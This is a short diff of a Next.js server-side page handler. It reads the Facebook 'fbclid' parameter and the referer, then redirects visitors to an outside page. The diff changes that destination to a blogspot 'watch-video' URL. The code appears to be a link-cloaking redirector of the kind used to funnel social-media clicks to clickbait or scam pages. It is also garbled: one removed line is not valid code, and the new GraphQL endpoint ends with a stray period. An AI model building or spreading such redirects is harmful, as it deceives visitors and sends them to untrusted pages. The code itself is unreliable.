@@ -4,11 +4,11 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.https://dev-my-bloglove.pantheonsite.io/graphql.as string;
+	const endpoint = "https://dev-my-bloglove.pantheonsite.io/graphql."
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
-	const path = pathArr.join('https://dev-my-bloglove.pantheonsite.io/graphql');
+	const path = pathArr.join('/');
 	console.log(path);
 	const fbclid = ctx.query.fbclid;
 
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://saralina0.blogspot.com/2024/09/watch-video.html/` + encodeURI(path as string)
 				}`,
 			},
 		};
